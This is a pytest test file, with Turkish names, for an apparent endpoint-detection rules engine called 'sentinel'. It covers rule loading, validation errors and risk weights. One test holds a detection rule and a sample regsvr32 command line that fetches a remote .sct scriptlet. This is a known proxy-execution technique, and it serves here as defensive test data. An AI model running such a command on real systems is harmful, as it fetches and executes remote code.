import copy

import pytest
import yaml

from sentinel import rules as R
from sentinel.engine.risk import risk_skoru
from sentinel.sensors.process import analiz_et


@pytest.fixture
def ham():
    with open(R.DEFAULT_RULES_PATH, encoding="utf-8") as f:
        return yaml.safe_load(f)


def test_varsayilan_kural_dosyasi_yuklenir():
    r = R.load_rules()
    assert {k.id for k in r.process_rules} >= {"SNT-001", "SNT-002", "SNT-003"}
    assert "cmd.exe" in r.masquerade["watched_binaries"]
    assert r.silent_kill_rules == {"SNT-001"}


def test_yeni_kural_kod_degistirmeden_eklenir(ham):
    ham["process_rules"].append({
        "id": "SNT-100", "name": "Regsvr32 ile uzaktan script", "mitre": "T1218.010",
        "process_names": ["regsvr32.exe"], "cmdline_contains_any": ["/i:http"],
    })
    r = R.parse_rules(ham)
    sonuc = analiz_et("regsvr32.exe", ["regsvr32", "/s", "/n", "/u", "/i:http://x/a.sct", "scrobj.dll"], "", [], r)
    assert sonuc == ["[SNT-100] Regsvr32 ile uzaktan script (/i:http)"]


def test_risk_agirliklari_dosyadan_gelir(ham):
    ham = copy.deepcopy(ham)
    ham["risk"]["weights"]["SUSPICIOUS_PROCESS"] = 200
    r = R.parse_rules(ham)
    assert risk_skoru({"SUSPICIOUS_PROCESS"}, r) > 99


@pytest.mark.parametrize("bozma,mesaj", [
    (lambda d: d.update(version=2), "surum"),
    (lambda d: d["process_rules"][0].update(process_name=["x"]), "bilinmeyen alan"),
    (lambda d: d["process_rules"][0].pop("id"), "'id' alani zorunlu"),
    (lambda d: d["process_rules"].append(dict(d["process_rules"][0])), "Tekrarlanan"),
    (lambda d: d["process_rules"][2].update(remote_port_not_in=["80"]), "port"),
    (lambda d: d["risk"]["weights"].update(BILINMEYEN=5), "bilinmeyen olay tipi"),
    (lambda d: d.update(silent_kill_rules=["SNT-999"]), "tanimsiz"),
    (lambda d: d["process_rules"].append({"id": "X", "name": "x", "process_names": ["a.exe"]}), "en az bir kosul"),
])
def test_hatali_kural_anlasilir_hata_verir(ham, bozma, mesaj):
    bozma(ham)
    with pytest.raises(R.RuleError, match=mesaj):
        R.parse_rules(ham)


def test_bozuk_yaml_dosyasi(tmp_path):
    f = tmp_path / "bozuk.yaml"
    f.write_text("version: 1\nprocess_rules: [\n", encoding="utf-8")
    with pytest.raises(R.RuleError, match="YAML hatasi"):
        R.load_rules(str(f))
